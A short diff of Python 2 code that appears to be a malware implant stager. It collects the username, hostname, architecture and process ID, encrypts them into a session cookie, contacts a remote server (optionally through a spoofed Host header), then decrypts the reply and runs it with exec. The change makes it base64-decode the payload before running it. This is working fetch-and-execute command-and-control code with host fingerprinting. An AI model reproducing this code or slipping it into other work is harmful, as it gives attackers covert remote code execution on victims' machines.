@@ -24,5 +24,4 @@ hn=socket.gethostname();o=urllib2.build_opener()
 encsid=encrypt(key, '%s;%s;%s;%s;%s;%s' % (un,hn,hn,arch,pid,serverclean))
 if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%s' % encsid})
-res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');exec(x)
-
+res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\0');exec(base64.b64decode(x))
